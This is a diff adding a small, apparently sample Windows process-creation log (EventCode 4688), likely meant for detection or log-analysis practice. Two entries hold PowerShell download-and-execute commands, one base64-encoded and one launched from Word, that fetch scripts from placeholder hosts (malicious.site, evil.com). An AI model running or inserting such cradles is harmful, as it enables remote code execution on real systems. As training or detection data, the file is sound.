@@ -1,0 +1,23 @@
+05/23/2026 10:11:22 AM
+EventCode=4688
+NewProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessName=C:\Windows\explorer.exe
+CommandLine=powershell.exe -EncodedCommand SQBFAFgAIAAoTmV3LU9iamVjdCBOZXQuV2ViQ2xpZW50KS5Eb3dubG9hZFN0cmluZygiaHR0cDovL21hbGljaW91cy5zaXRlL3BheWxvYWQucHMxIik=
+User=NASEEF-PC\naseef
+Computer=NASEEF-PC
+
+05/23/2026 10:14:11 AM
+EventCode=4688
+NewProcessName=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+ParentProcessName=C:\Program Files\Microsoft Office\WINWORD.EXE
+CommandLine=powershell.exe IEX(New-Object Net.WebClient).DownloadString('http://evil.com/a.ps1')
+User=NASEEF-PC\naseef
+Computer=NASEEF-PC
+
+05/23/2026 10:20:55 AM
+EventCode=4688
+NewProcessName=C:\Windows\System32\notepad.exe
+ParentProcessName=C:\Windows\explorer.exe
+CommandLine=notepad.exe
+User=NASEEF-PC\naseef
+Computer=NASEEF-PC
